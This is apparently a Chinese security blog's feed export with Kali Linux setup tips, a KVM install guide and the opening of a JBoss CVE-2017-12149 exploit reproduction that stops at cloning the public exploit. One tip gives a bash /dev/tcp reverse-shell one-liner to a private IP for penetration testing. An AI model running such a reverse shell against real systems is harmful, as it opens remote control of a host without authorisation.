title="&emsp;&emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！"></a>&emsp;&emsp;用了快一年的kali了，使用过里面上百种工具，对kali有种莫名的好感，不过以前都是在虚拟机里面使用kali的，这样不太过瘾，所以这学期将家里积灰多年的老式台式电脑搬到了寝室，换了CPU添了内存条拆了电源箱插了无线网卡才装了kali。就想好好体验一把不一样的感觉！以后的文章我会将平时使用kali的心得技巧都记录在案，让各位能像熟悉windows一样熟悉kali，同时也希望将网上一些以讹传讹的操作重新梳理一遍！</h4><a id="more"></a>
<h2 id="0x01-kali安装中文输入法"><a href="#0x01-kali安装中文输入法" class="headerlink" title="0x01. kali安装中文输入法"></a>0x01. kali安装中文输入法</h2><blockquote>
<ol>
<li>下载ibus</li>
</ol>
<p>apt-get install ibus ibus-pinyin</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301093227_Bi7qWn_Screenshot.jpeg)</p>
<blockquote>
<ol>
<li>设置language，之后重启系统就能使用中文，不必太麻烦</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301093613_rmRK04_Screenshot.jpeg)</p>
<h2 id="0x02-kali中安装截图软件-shutter"><a href="#0x02-kali中安装截图软件-shutter" class="headerlink" title="0x02. kali中安装截图软件 shutter"></a>0x02. kali中安装截图软件 shutter</h2><blockquote>
<p>apt-get install shutter</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301201713_O1AXhi_Screenshot.jpeg)</p>
<blockquote>
<p>下面就是我用shutter截的桌面图片</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180301201931_pWfnu9_Screenshot.jpeg)</p>
<h2 id="0x03-kali-安装硬件检测软件-hardinfo"><a href="#0x03-kali-安装硬件检测软件-hardinfo" class="headerlink" title="0x03. kali 安装硬件检测软件 hardinfo"></a>0x03. kali 安装硬件检测软件 hardinfo</h2><blockquote>
<p>apt-get install hardinfo</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303170704_ALlIlf_Screenshot.jpeg)</p>
<blockquote>
<p>hardinfo可以让我们轻松的查看系统硬件配置，其功能有点像鲁大师，不过我却没用过鲁大师哈哈哈哈！</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303170842_Vw0EnH_Screenshot.jpeg)</p>
<h2 id="0x04-kali-录屏软件-EasyScreenCast"><a href="#0x04-kali-录屏软件-EasyScreenCast" class="headerlink" title="0x04. kali 录屏软件 EasyScreenCast"></a>0x04. kali 录屏软件 EasyScreenCast</h2><blockquote>
<p>今天笔者也利用kali中自带的录屏软件 EasyScreenCast 录了一个Wi-Fi破解的视频放到B站，如果感兴趣可以<a href="https://www.bilibili.com/video/av20318401/" target="_blank" rel="external">戳这里</a>。EasyScreenCast 使用简单方便，根据自己需要稍稍修改一下参数就能录制满足自己简单要求的视频。</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303171817_6QKqw8_Screenshot.jpeg)</p>
<h2 id="0x05-kali-音乐播放器-VLC"><a href="#0x05-kali-音乐播放器-VLC" class="headerlink" title="0x05. kali 音乐播放器 VLC"></a>0x05. kali 音乐播放器 VLC</h2><blockquote>
<p>虽然 VLC 没有像 Mac 版QQ 音乐那么唯美的优化，但我们也不能对开源如此苛刻，毕竟它从没令我失望过！</p>
<p>apt-get install vlc</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303191548_k9LYCB_Screenshot.jpeg)</p>
<blockquote>
<p>安装完成之后，因为它默认不能以root账号启动，所以我们需要修改 /usr/bin/vlc 文件，将原来的geteuid 修改为现在的 getppid</p>
<p>hexedit /usr/bin/vlc</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303191650_jLTfN6_Screenshot.jpeg)</p>
<blockquote>
<p>在终端输入 vlc 就能调出</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303193126_rzgeBG_Screenshot.jpeg)</p>
<h2 id="0x06-kali-使用bash-一句话反弹shell"><a href="#0x06-kali-使用bash-一句话反弹shell" class="headerlink" title="0x06. kali 使用bash 一句话反弹shell"></a>0x06. kali 使用bash 一句话反弹shell</h2><blockquote>
<p>进行渗透测试时经常遇到Linux 中不存在 nc 或者 nc 一经反弹shell就出现各种报错，直到遇到bash 一句话后麻麻再也不用担心我拿不到shell 啦！！</p>
<p>bash -i &gt;&amp; /dev/tcp/192.168.1.107/4444 0&gt;&amp;1</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303192839_XDBQbF_Screenshot.jpeg)</p>
<h2 id="0x07-kali-使用ncat-作-http-代理"><a href="#0x07-kali-使用ncat-作-http-代理" class="headerlink" title="0x07. kali 使用ncat 作 http 代理"></a>0x07. kali 使用ncat 作 http 代理</h2><blockquote>
<p>当需要代理服务器时，可以使用 ncat 来代替，当然这是需要密码验证的，也不是任何人都能通过我们的代理服务器上网</p>
<p>ncat -l 8080 <strong>-</strong>-proxy-type http –proxy-auth admin:root</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303195304_KAYICq_Screenshot.jpeg)</p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180303195334_duCLPP_Screenshot.jpeg)</p>
<h2 id="0x08-kali-使用squid3-作http-代理"><a href="#0x08-kali-使用squid3-作http-代理" class="headerlink" title="0x08. kali 使用squid3 作http 代理"></a>0x08. kali 使用squid3 作http 代理</h2><blockquote>
<p>squid3 可以很方便的帮助我们搭建内网的http 代理服务器，当我们启动squid3 之后它会默认启动3128 端口，我们只需要在浏览器设置代理就可以使用了。不过在这之前我们首先应该修改squid3 的默认配置，将 /etc/squid/squid.conf 中的http_access deny all 修改为http_access allow all 这样才能作为代理服务器使用</p>
<p>vim /etc/squid/squid.conf</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305175930_Xks0id_Screenshot.jpeg)</p>
<blockquote>
<p>squid3</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305180011_6T2Daa_Screenshot.jpeg)</p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305180036_Uxee4d_Screenshot.jpeg)</p>
<h2 id="0x09-kali-安装翻译字典"><a href="#0x09-kali-安装翻译字典" class="headerlink" title="0x09. kali 安装翻译字典"></a>0x09. kali 安装翻译字典</h2><blockquote>
<p>goldendict 是Linux 中字典的不二选择，同时它还支持选词翻译，这是一个相当不错的功能。笔者因为给自己定了个目标要看kali 官网的教程，所以只有去读英文资料，而goldendict 帮了我不小的忙！</p>
<p>下载好goldendict 之后需要稍稍配置一下词典Edict-&gt;dict-&gt;website，增加youdao 的翻译网址 <a href="http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8" target="_blank" rel="external">http://dict.youdao.com/search?q=%GDWORD%&amp;ue=utf8</a></p>
<p>之后我们选中单词按 CTRL+C+C 就可以随时翻译了</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305231416_6b8vJS_Screenshot.jpeg)</p>
<h2 id="0x10-kali-安装插件"><a href="#0x10-kali-安装插件" class="headerlink" title="0x10. kali 安装插件"></a>0x10. kali 安装插件</h2><blockquote>
<p>使用浏览器访问 <a href="http://extensions.gnome.org" target="_blank" rel="external">http://extensions.gnome.org</a> 就可以给kali 安装扩展，安装netspeed 插件之后就可以监控网络流量</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97(%E4%B8%80" alt="">/20180305235955_Y7cZTJ_Screenshot.jpeg)</p>
<h2 id="0xFF-关于kali的小技巧"><a href="#0xFF-关于kali的小技巧" class="headerlink" title="0xFF. 关于kali的小技巧"></a>0xFF. 关于kali的小技巧</h2><h4 id="emsp-emsp-笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽-o-。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。"><a href="#emsp-emsp-笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽-o-。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。" class="headerlink" title="&emsp;&emsp;笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽 \^o^。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。"></a>&emsp;&emsp;笔者在使用kali的过程中有时候会很郁闷的出现屏幕突然卡死，鼠标直接动不了的情况，过去常用的的做法是直接断电源强制关机重启，百试不爽 \^o^。可这毕竟不是长久之际，如此暴力的做法不仅会损坏磁道，更会令内存中正在运行的任务直接关闭，所以我采取了下列做法能够很好的解决问题。</h4><h4 id="emsp-emsp-1-利用组合键-CTRL-ALT-F6-进入kali的命令行模式"><a href="#emsp-emsp-1-利用组合键-CTRL-ALT-F6-进入kali的命令行模式" class="headerlink" title="&emsp;&emsp;1. 利用组合键 CTRL+ALT+F6 进入kali的命令行模式"></a>&emsp;&emsp;1. 利用组合键 CTRL+ALT+F6 进入kali的命令行模式</h4><h4 id="emsp-emsp-2-top命令查看当前CPU占用率最大的任务"><a href="#emsp-emsp-2-top命令查看当前CPU占用率最大的任务" class="headerlink" title="&emsp;&emsp;2. top命令查看当前CPU占用率最大的任务"></a>&emsp;&emsp;2. top命令查看当前CPU占用率最大的任务</h4><h4 id="emsp-emsp-3-pkill或者kill-掉该任务"><a href="#emsp-emsp-3-pkill或者kill-掉该任务" class="headerlink" title="&emsp;&emsp;3. pkill或者kill 掉该任务"></a>&emsp;&emsp;3. pkill或者kill 掉该任务</h4><h4 id="emsp-emsp-4-利用组合键-CTRL-ALT-F2-回到桌面环境，这样就有效的解决了桌面卡死的问题"><a href="#emsp-emsp-4-利用组合键-CTRL-ALT-F2-回到桌面环境，这样就有效的解决了桌面卡死的问题" class="headerlink" title="&emsp;&emsp;4. 利用组合键 CTRL+ALT+F2 回到桌面环境，这样就有效的解决了桌面卡死的问题"></a>&emsp;&emsp;4. 利用组合键 CTRL+ALT+F2 回到桌面环境，这样就有效的解决了桌面卡死的问题</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[kali安装KVM入坑笔记]]></title>
      <url>/2018/03/01/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…"><a href="#emsp-emsp-今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM-…" class="headerlink" title="&emsp;&emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …"></a>&emsp;&emsp;今天莫名奇妙的把自己的KVM和kali都搞崩了，心塞塞。趁着重装系统之余将安装kali和KVM的详细过程介绍给大家，下面笔者将用U盘在台式机上安装kali和KVM …</h4><a id="more"></a>
<h2 id="0x01-制作U盘启动盘"><a href="#0x01-制作U盘启动盘" class="headerlink" title="0x01. 制作U盘启动盘"></a>0x01. 制作U盘启动盘</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-kali-的-ISO-镜像文件"><a href="#emsp-emsp-1-kali-的-ISO-镜像文件" class="headerlink" title="&emsp;&emsp; 1. kali 的 ISO 镜像文件"></a>&emsp;&emsp; 1. kali 的 ISO 镜像文件</h4><h4 id="emsp-emsp-2-dd-命令-Linux-的bash基本都具备dd，笔者用的Mac也同样可以"><a href="#emsp-emsp-2-dd-命令-Linux-的bash基本都具备dd，笔者用的Mac也同样可以" class="headerlink" title="&emsp;&emsp; 2. dd 命令( Linux 的bash基本都具备dd，笔者用的Mac也同样可以)"></a>&emsp;&emsp; 2. dd 命令( Linux 的bash基本都具备dd，笔者用的Mac也同样可以)</h4><h4 id="emsp-emsp-3-内存足够的-U-盘"><a href="#emsp-emsp-3-内存足够的-U-盘" class="headerlink" title="&emsp;&emsp; 3. 内存足够的 U 盘"></a>&emsp;&emsp; 3. 内存足够的 U 盘</h4><h3 id="制作启动盘"><a href="#制作启动盘" class="headerlink" title="制作启动盘"></a>制作启动盘</h3><blockquote>
<ol>
<li>查看U盘挂载的路径 diskutil list</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228215645_iufWDx_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>卸载U盘 diskutil unmountDisk /dev/disk2</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228215821_WGGQLO_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>用dd命令制作安装盘（这个过程大概持续10+分钟，急不得\^o^ ）</li>
</ol>
<p>sudo dd if=/Users/apple1/Desktop/kali-linux-2018.1-amd64.iso of=/dev/disk2 bs=1m</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228222201_a2Gt2A_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-利用-U盘启动盘安装kali"><a href="#0x02-利用-U盘启动盘安装kali" class="headerlink" title="0x02. 利用 U盘启动盘安装kali"></a>0x02. 利用 U盘启动盘安装kali</h2><blockquote>
<ol>
<li><p>将 U盘启动盘插入台式机，启动电源并按住Delete键进入BIOS模式</p>
</li>
<li><p>选择高级模式，开启Intel的虚拟技术（ 开启这个之后才能安装KVM ）</p>
</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228222954_ou6My2_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>选择系统的启动顺序，将U盘放到最前面</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228223237_pRdztx_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>现在就可以保存退出了，就能进入kali的安装界面，kali安装过程就不介绍了，网上一大堆安装教程</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228223402_BBNrKS_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>安装完成之后进入kali系统</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228225257_Ei4Sz0_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-安装KVM"><a href="#0x03-安装KVM" class="headerlink" title="0x03. 安装KVM"></a>0x03. 安装KVM</h2><blockquote>
<ol>
<li>刚下载的系统需要先更新源 vim /etc/apt/sources.list</li>
</ol>
<p>#中科大</p>
<p>deb <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="external">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
<p>deb-src <a href="http://mirrors.ustc.edu.cn/kali" target="_blank" rel="external">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>
<p>#阿里云</p>
<p>deb <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="external">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
<p>deb-src <a href="http://mirrors.aliyun.com/kali" target="_blank" rel="external">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</p>
<ol>
<li>更新索引 apt-get update</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228231246_F7Xk8C_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>下载KVM及其依赖包</li>
</ol>
<p>apt-get install kvmtool qemu virtinst python-libvirt virt-viewer virt-manager</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228231559_jUPJBA_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>KVM 下载完成，查看是否正常启动(笔者已经可以正常使用KVM了)</li>
</ol>
<p>service libvirtd status</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228231853_87vYF9_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>打开KVM，安装windows 2003 server r2 镜像</li>
</ol>
<p>virt-manager</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228233431_Nknrv6_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228233108_OVhcrA_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180228233136_Tfl8g6_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>安装完之后有可能启动虚拟机时有可能会报错提示：Error starting domain: Requested operation is not valid: network ‘default’ is not active </li>
</ol>
<p>此时我们只需要将原有的网卡删除重新添加一块网卡就可以了</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180301094610_WjQFmC_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180301094845_S7Zuib_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180301095052_jL9mvJ_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E5%AE%89%E8%A3%85KVM%E5%85%A5%E5%9D%91%E7%AC%94%E8%AE%B0/20180301095118_iosA7r_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h2><h4 id="emsp-emsp-网上很多教程实际去操作时感觉都有些许瑕疵，很多时候达不到自己的要求，所以自己记录一下平时配置环境的过程下次遇到时看自己的文章就可以了，哇咔咔！！"><a href="#emsp-emsp-网上很多教程实际去操作时感觉都有些许瑕疵，很多时候达不到自己的要求，所以自己记录一下平时配置环境的过程下次遇到时看自己的文章就可以了，哇咔咔！！" class="headerlink" title="&emsp;&emsp;网上很多教程实际去操作时感觉都有些许瑕疵，很多时候达不到自己的要求，所以自己记录一下平时配置环境的过程下次遇到时看自己的文章就可以了，哇咔咔！！"></a>&emsp;&emsp;网上很多教程实际去操作时感觉都有些许瑕疵，很多时候达不到自己的要求，所以自己记录一下平时配置环境的过程下次遇到时看自己的文章就可以了，哇咔咔！！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[JOBSS反序列化漏洞复现]]></title>
      <url>/2017/12/27/JBOSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00. 漏洞描述"></a>0x00. 漏洞描述</h2><h4 id="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"><a href="#2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。" class="headerlink" title="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"></a>2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。</h4><a id="more"></a>
<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01. 漏洞复现"></a>0x01. 漏洞复现</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1). 环境准备"></a>1). 环境准备</h3><h4 id="1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip"><a href="#1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip" class="headerlink" title="1. JBOSS下载地址：http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip"></a>1. JBOSS下载地址：<a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a></h4><h4 id="2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149"><a href="#2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149" class="headerlink" title="2. EXP下载地址：https://github.com/yunxu1/jboss-_CVE-2017-12149"></a>2. EXP下载地址：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></h4><h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2). 环境搭建"></a>2). 环境搭建</h3><h4 id="第一步：下载JBOSS环境，并解压"><a href="#第一步：下载JBOSS环境，并解压" class="headerlink" title="第一步：下载JBOSS环境，并解压"></a>第一步：下载JBOSS环境，并解压</h4><blockquote>
<p>wget <a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a> </p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180801_LeUN0c_6293.jpeg" alt=""></p>
<h4 id="第二步：修改配置文件，使网络中的主机都能访问JBOSS"><a href="#第二步：修改配置文件，使网络中的主机都能访问JBOSS" class="headerlink" title="第二步：修改配置文件，使网络中的主机都能访问JBOSS"></a>第二步：修改配置文件，使网络中的主机都能访问JBOSS</h4><blockquote>
<p>vim ~/jboss-6.1.0.Final/server/default/deploy/jbossweb.sar/server.xml</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180817_sOlp2c_6301.jpeg" alt=""></p>
<h4 id="第三步：启动JBOSS"><a href="#第三步：启动JBOSS" class="headerlink" title="第三步：启动JBOSS"></a>第三步：启动JBOSS</h4><blockquote>
<p>./jboss-6.1.0.Final/bin/run.sh</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/JOBSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171227180832_WE4CD3_6309.jpeg" alt=""></p>
<h4 id="第四步：下载EXP"><a href="#第四步：下载EXP" class="headerlink" title="第四步：下载EXP"></a>第四步：下载EXP</h4><blockquote>
<p>git clone <a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></p>
</blockquote>
